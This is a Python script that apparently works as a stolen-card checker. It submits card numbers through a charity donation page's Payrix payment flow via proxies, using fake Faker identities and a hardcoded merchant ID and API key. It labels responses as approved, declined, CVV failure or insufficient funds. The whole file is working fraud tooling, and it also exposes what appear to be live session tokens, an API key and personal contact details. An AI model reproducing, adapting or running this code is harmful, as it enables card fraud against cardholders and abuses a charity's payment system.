import requests
import uuid
from faker import Faker
from httpx import AsyncClient

async def payrix(cc,mes,ano,cvv,proxyg):
    async with AsyncClient(verify=False,proxy=proxyg) as web:
        fake = Faker()
        email = f'{uuid.uuid4()}@gmail.com'

        headers = {
            'Accept': 'application/json, text/javascript, */*; q=0.01',
            'Accept-Language': 'es-ES,es;q=0.9,en;q=0.8',
            'Cache-Control': 'no-cache',
            'Connection': 'keep-alive',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            # 'Cookie': 'gd_sid=grlqvslvo645hc2tmlc0nkh3uu; 12_16_24=n4q0pnv3gb1mqt45npobrop0hi; PHPSESSID=grlqvslvo645hc2tmlc0nkh3uu',
            'Origin': 'https://donate.givedirect.org',
            'Pragma': 'no-cache',
            'Referer': 'https://donate.givedirect.org/migrate/?cid=480',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
            'X-Requested-With': 'XMLHttpRequest',
            'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
        }

        data = {
            'action': 'insert',
            'formData[0][name]': 'csrf_token',
            'formData[0][value]': 'grlqvslvo645hc2tmlc0nkh3uuxud7ApjJTaSS0S1RkPA1APXuXQZVlbYN',
            'formData[1][name]': 'txnid',
            'formData[1][value]': 'GD1458273',
            'formData[2][name]': 'customer_id',
            'formData[2][value]': '',
            'formData[3][name]': 'cc_fee',
            'formData[3][value]': '0.145',
            'formData[4][name]': 'charity_fee',
            'formData[4][value]': '0.05',
            'formData[5][name]': 'feeAmount',
            'formData[5][value]': '0.49',
            'formData[6][name]': 'paytype',
            'formData[6][value]': 'Card',
            'formData[7][name]': 'amount',
            'formData[7][value]': '5.00',
            'formData[8][name]': 'fee_amount',
            'formData[8][value]': '',
            'formData[9][name]': 'cover_fee_required',
            'formData[9][value]': '0',
            'formData[10][name]': 'frequency',
            'formData[10][value]': 'One Time',
            'formData[11][name]': 'ccrecurring',
            'formData[11][value]': '',
            'formData[12][name]': 'DonationType',
            'formData[12][value]': 'One Time',
            'formData[13][name]': 'selected-frequency',
            'formData[13][value]': 'One Time',
            'formData[14][name]': 'user',
            'formData[14][value]': '',
            'formData[15][name]': 'pass',
            'formData[15][value]': '',
            'formData[16][name]': 'company_name',
            'formData[16][value]': '',
            'formData[17][name]': 'employee_email',
            'formData[17][value]': '',
            'formData[18][name]': 'tribute_name',
            'formData[18][value]': '',
            'formData[19][name]': 'tribute_notifyname',
            'formData[19][value]': '',
            'formData[20][name]': 'tribute_email',
            'formData[20][value]': '',
            'formData[21][name]': 'tribute_address',
            'formData[21][value]': '',
            'formData[22][name]': 'tribute_city',
            'formData[22][value]': '',
            'formData[23][name]': 'tribute_state',
            'formData[23][value]': 'NJ',
            'formData[24][name]': 'tribute_zip',
            'formData[24][value]': '',
            'formData[25][name]': 'tribute_occasion',
            'formData[25][value]': '',
            'formData[26][name]': 'includeamount_flag',
            'formData[26][value]': '0',
            'formData[27][name]': 'firstname',
            'formData[27][value]': 'Sebastian',
            'formData[28][name]': 'lastname',
            'formData[28][value]': 'Gutierrez',
            'formData[29][name]': 'email',
            'formData[29][value]': 'scarlatmario4@tiktok.tf',
            'formData[30][name]': 'phone',
            'formData[30][value]': '5059947000',
            'formData[31][name]': 'phone_type',
            'formData[31][value]': 'Mobile',
            'formData[32][name]': 'company',
            'formData[32][value]': 'Hunter',
            'formData[33][name]': 'country',
            'formData[33][value]': 'USA',
            'formData[34][name]': 'add1',
            'formData[34][value]': '103-105 Central Avenue',
            'formData[35][name]': 'add2',
            'formData[35][value]': '',
            'formData[36][name]': 'city',
            'formData[36][value]': 'Orange',
            'formData[37][name]': 'statelist',
            'formData[37][value]': 'NJ',
            'formData[38][name]': 'state',
            'formData[38][value]': 'NJ',
            'formData[39][name]': 'zip',
            'formData[39][value]': '07050-3824',
            'formData[40][name]': 'comments',
            'formData[40][value]': '',
            'formData[41][name]': 'payment_method',
            'formData[41][value]': 'Card',
            'formData[42][name]': 'cczip',
            'formData[42][value]': '10010',
            'formData[43][name]': 'routing',
            'formData[43][value]': '',
            'formData[44][name]': 'account',
            'formData[44][value]': '',
            'formData[45][name]': 'form_id',
            'formData[45][value]': '480',
            'formData[46][name]': 'charity_id',
            'formData[46][value]': '22',
            'formData[47][name]': 'form_type',
            'formData[47][value]': 'Donation',
            'formData[48][name]': 'ein',
            'formData[48][value]': '68-0259118_5.00',
            'appId': 'grlqvslvo645hc2tmlc0nkh3uu',
        }

        response = await web.post('https://donate.givedirect.org/migrate/dboperations.php', headers=headers, data=data)        
        
        headers = {
            'accept': 'application/json, text/javascript, */*; q=0.01',
            'accept-language': 'es-ES,es;q=0.9,en;q=0.8',
            'apikey': '2a8ff60650dd864a86fba778e4b04848',
            'cache-control': 'no-cache',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            # 'cookie': '__cf_bm=d.NsvkN4gbyvv6iBzLiL8inKcsmqlNauHT4XmiqZ3vs-1734336007-1.0.1.1-AnCy6aEVfpvD3SdEbAyFvcPvNAnISobLsa4ysbpRuzeQuTm1GUha9Qfo6z_cqPiwRgqBRD1.W90EK38_3hkyZA',
            'origin': 'https://api.payrix.com',
            'pragma': 'no-cache',
            'priority': 'u=1, i',
            'referer': 'https://api.payrix.com/payFields/?section=main',
            'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',
        }

        data = {
            'origin': '8',
            'merchant': 'p1_mer_6690221c22faa66a692af20',
            'type': '2',
            'total': '0',
            'description': 'donate live site',
            'payment[number]': cc,
            #'payment[cvv]': cvv,
            'expiration': mes + ano[-2:],
            'address1': fake.address(),
            'city': fake.city(),
            'zip': '10010',
            'email': email,
            'address2': '',
            'country': 'USA',
            'company': fake.company(),
            'first': fake.first_name(),
            'last': fake.last_name(),
            'tmxSessionId': '7df7daca-d4c3-4ea6-88cd-5faf802512ea',
        }
        
        req1 = await web.post('https://api.payrix.com/txns', headers=headers, data=data)
        print(req1.text)
        if "Incorrect billing zip code." in req1.text:
            status = "Approved ✅"
            mensaje = "Approved"
        else:
            mensaje = req1.text.split('"msg":"')[1].split('"')[0]
            if "Insufficient funds" in mensaje:
                status = "Insufficient funds ❌"
            elif "Cvv2" in mensaje:
                status = "Cvv2 ❌"
            else:
                status = "Declined ❌"
        return status,mensaje
